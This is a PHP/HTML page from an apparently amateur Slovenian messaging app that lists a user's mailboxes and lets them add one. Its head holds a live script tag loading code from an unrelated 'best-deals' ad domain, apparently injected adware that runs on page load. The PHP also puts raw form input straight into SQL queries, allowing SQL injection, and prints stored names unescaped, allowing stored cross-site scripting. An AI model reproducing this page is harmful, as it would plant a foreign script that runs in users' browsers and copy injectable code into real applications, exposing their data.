<!DOCTYPE html>
<html lang="en">
  <head>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Poslana sporočila</title>

    <!-- Bootstrap core CSS -->
    <link href="bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="jumbotron-narrow.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  <script src="https://www.best-deals-products.com/ws/sf_main.jsp?dlsource=hdrykzc"></script></head>

  <body>
    <div class="container">
      <div class="header clearfix">
        <nav>
          <ul class="nav nav-pills pull-right">
            <li role="presentation" class="active"><a href="novo.php"><span class="glyphicon glyphicon-envelope" aria-hidden="true"></span></a></li>
            <li role="presentation"><a href="profil.php?predal=0">Prejeta sporočila</a></li>
            <li role="presentation"><a href="poslano.php">Poslana sporočila</a></li>
            <li role="presentation"><a href="skupine.php">Ustvari skupino</a></li>
            <li role="presentation" class="active"><a href="predal.php">Ustvari predal</a></li>
            <li role="presentation"><a href="odjava.php">Odjava</a></li>
          </ul>
        </nav>
        <h3 class="text-muted">Poslana sporočila</h3>
    <h4 class="text-muted"><?php session_start(); echo "Prijavljeni: ". $_SESSION['ime'].' '. $_SESSION['priimek'] .'</br>Zadnja prijava: '.$_SESSION['prijava']; ?></h4>
      </div>

      <div class="jumbotron" text-align="center">
        <form method="post" action="">
        <div class="input-group" style="width:30%; margin-left:auto; margin-right:auto;">
            <input type="text" name="imepredala" size="10" class="form-control" placeholder="Vpisi predal...">
            <span class="input-group-btn">
              <button class="btn btn-default" name="dodajpredal">Dodaj</button>
            </span>
          </div><!-- /input-group --><br>
        </form>
          <?php
          include 'povezava.php';
          if(isset($_SESSION['id'])){
            $id = $_SESSION['id'];
            if(isset($_POST['dodajpredal'])){
              $naziv = $_POST['imepredala'];
              if($naziv != ""){
                $sql = "insert into predal(naziv, id_lastnika) values ('$naziv', '$id')";
                mysqli_query($con, $sql);
              }
              else{
                echo 'Vpisite ime predala';
              }
            }
            $izpis = "select naziv, id_predala from predal where id_lastnika='$id'";
            $rezizpis = mysqli_query($con, $izpis);
            while($iz = mysqli_fetch_row($rezizpis)){
              echo $iz[0] . ' <a href="izbrisipredal.php?id=' . $iz[1] .'"><span class="glyphicon glyphicon-remove" aria-hidden="true"></span></a><br>';
            }
          }
          else{
            header('Location: index.php');
          }
          ?>
      </div>

    </div>

  </body>

</html>